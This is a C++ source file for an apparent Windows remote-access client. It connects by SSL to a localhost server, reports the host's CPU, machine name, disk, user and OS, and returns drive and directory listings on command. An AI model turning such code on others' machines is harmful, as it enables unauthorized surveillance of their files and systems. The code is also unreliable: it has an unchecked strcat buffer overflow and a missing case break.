﻿#include "Powershell.h"
#include <AES_CBC256.h>
#include "ClientInitial.h"
#include "Package.h"
#include <stack>
#include <filesystem>
#include <vector>
#include <ctime>
#include <sys/types.h>
#include <sys/stat.h>

#include "stdio.h"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8888
#define CERTF  "client.crt" 
#define KEYF  "client.key"  
#define CACERT "ca.crt"     



extern "C"
{
#include <openssl/applink.c>
};
HANDLE g_hReadOfChild;
HANDLE g_hWriteOfChild;
HANDLE g_hReadOfParent;
HANDLE g_hWriteOfParent;

//SendData
int WINAPI SendFunc(LPVOID lpParameter)
{

	return 0;

}


//RecieveData
void  RecvFunc(SSL* sslHandle)
{
	Data* data = new Data();
	cout << "start recv..." << endl;
	int bytesRecv = 1;
	AES_CBC256 m_pcAES_CBC256;

	do {
		bytesRecv = m_pcAES_CBC256.SSL_AES256_recvData(m_pcAES_CBC256, data, sslHandle);
		switch (data->nFlag)
		{
		case 1://FileBrose
		{

			//driver
			Data senddata = { 0 };
			size_t szAllDriveStr = GetLogicalDriveStrings(0, NULL);
			char* pDriveStr = new char[szAllDriveStr + sizeof((""))];
			string strPath;
			GetLogicalDriveStrings(szAllDriveStr, pDriveStr);


			int nCnt = 0;
			memcpy(senddata.szMsg, pDriveStr, szAllDriveStr);
			senddata.nFlag = 2;//send driver 
			if (szAllDriveStr > 0)
			{
				int bytesSent = m_pcAES_CBC256.SSL_AES256_sendData(m_pcAES_CBC256, senddata, sslHandle);
				if (bytesSent <= 0) {
					cout << "Failed to send driver!" << std::endl;
					break;
				}

			}
			break;

		}
		case 2://send files of specify path
		{
			char path[2048];//!!
			Data senddata = { 0 };
			memcpy(path, data->szMsg, sizeof(data->szMsg));
			//CDROM?
			if (GetDriveType(path) == DRIVE_CDROM) {
				cout << "Driver!!!!!" << endl;
				break;
			}
			strcat(path, "\\*.*");
			
			FileInfo fileinfo;
			WIN32_FIND_DATA FindFileData = { 0 };
			HANDLE hFindFile = FindFirstFile(path, &FindFileData);
			if (INVALID_HANDLE_VALUE == hFindFile)
			{
				break;
			}
			int nSet = 0;
			while (true)
			{

				BOOL bRet = FindNextFile(hFindFile, &FindFileData);

				if (!bRet)
				{
					break;
				}
				string strFileName = FindFileData.cFileName;

				if (strFileName == ".")
				{
					continue;
				}
					//get size and type
				if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // directory
				{
					fileinfo.dwAttribute = 0;
					fileinfo.dwSize = 0; // directory set size 0

				}
				else //File size 
				{

					fileinfo.dwAttribute = 1;//FIle
					LARGE_INTEGER liSize;
					liSize.LowPart = FindFileData.nFileSizeLow;
					liSize.HighPart = FindFileData.nFileSizeHigh;
					fileinfo.dwSize = static_cast<int>(liSize.QuadPart);
				}
				memcpy(fileinfo.name, FindFileData.cFileName, sizeof(fileinfo.name));//get name
				fileinfo.ftCreationTime = FindFileData.ftLastWriteTime;//get time

				memcpy(senddata.szMsg + nSet, &fileinfo, sizeof(fileinfo));//144
				//0....143 144.....287
				nSet += sizeof(fileinfo);
				if (nSet / 144 == 10)
				{
					senddata.nFlag = 3;
					int bytesSent = m_pcAES_CBC256.SSL_AES256_sendData(m_pcAES_CBC256, senddata, sslHandle);
					memset(&senddata, 0, sizeof(senddata));
					if (bytesSent <= 0) {
						cout << "Failed to send driver!" << std::endl;
					}
					nSet = 0;

				}

				
			}
			if (nSet / 144 < 10)
			{
				senddata.nFlag = 3;
				int bytesSent = m_pcAES_CBC256.SSL_AES256_sendData(m_pcAES_CBC256, senddata, sslHandle);
				if (bytesSent <= 0) {
					cout << "Failed to send driver!" << std::endl;
				}
			}

		}
		default:
			break;
		}

	} while (bytesRecv > 0);
	
}


int main() {

	PC_INFO pc_info;
	strcpy(pc_info.szCPU, getCpuInfo().c_str());
	strcpy(pc_info.szPC_NAME, GetPCName().c_str());
	strcpy(pc_info.szDISK, GetDisk().c_str());
	strcpy(pc_info.szCURRENT_USER, GetCurrentUserName().c_str());
	strcpy(pc_info.szOS, getOsInfo().c_str());



	int seed_int[100];
	int err;
	////Winsock_init 
	if (!InitialWincock())
	{
		return 0;
	}
	//Initial SSL
	SSL_CTX* sslContext = SSL_Initialize();
	//set Cipher suites
	if (!SSL_CTX_set_cipher_list(sslContext, "AES256-SHA"))
	{
		ERR_print_errors_fp(stderr);
		SSL_CTX_free(sslContext);
		return 1;
	}

	// generate rand number（WIN32 must add it）
	srand((unsigned)time(NULL));
	for (int i = 0; i < 100; i++)
		seed_int[i] = rand();
	RAND_seed(seed_int, sizeof(seed_int));



	//create socket
	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockClient == INVALID_SOCKET)
	{
		cerr << "socket failed." << endl;
		WSACleanup();
		return 1;
	}
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = inet_addr(SERVER_IP);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(SERVER_PORT);


	//request to Server
	if (connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)) == SOCKET_ERROR)
	{
		cerr << "connect failed." << endl;
		closesocket(sockClient);
		return 1;
	}
	cout << "connectting server" << SERVER_PORT << "..." << endl;
	SSL* sslHandle = SSL_new(sslContext);
	if (sslHandle == nullptr)
	{
		cerr << "SSL_new Failed" << endl;
	}
	SSL_set_fd(sslHandle, static_cast<int> (sockClient));
	int Ret = SSL_connect(sslHandle);
	if (Ret <= 0)
	{
		handle_error(__FILE__, __LINE__, "SSL_connect() failed");
	}



	if (Ret != 1)
	{
		ERR_print_errors_fp(stderr);
		SSL_shutdown(sslHandle);
		closesocket(sockClient);
		return 1;
	}
	cout << "connect success" << SERVER_PORT << "..." << endl;
	Sleep(1000);

	AES_CBC256 AES_CBC256;
	int bytesSent = AES_CBC256.SSL_AES256_sendData(AES_CBC256, pc_info, sslHandle);





	HANDLE threadRec = NULL;
	//HANDLE threadSend = NULL;
	//if (threadSend == NULL)
	//{
	//	threadSend = ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendFunc, sslHandle, 0, NULL);   //创建线程, 发送数据
	//}
	if (threadRec == NULL)
	{
		threadRec = ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecvFunc, sslHandle, 0, NULL);
	}
	HANDLE harr[1] = { threadRec };
	WaitForMultipleObjects(1, harr, true, INFINITE);

	if (threadRec != NULL)
		CloseHandle(threadRec);
	/*if (threadSend != NULL)
		CloseHandle(threadSend);*/

	SSL_shutdown(sslHandle);
	closesocket(sockClient);
	WSACleanup();
	SSL_CTX_free(sslContext);

	return 0;
}
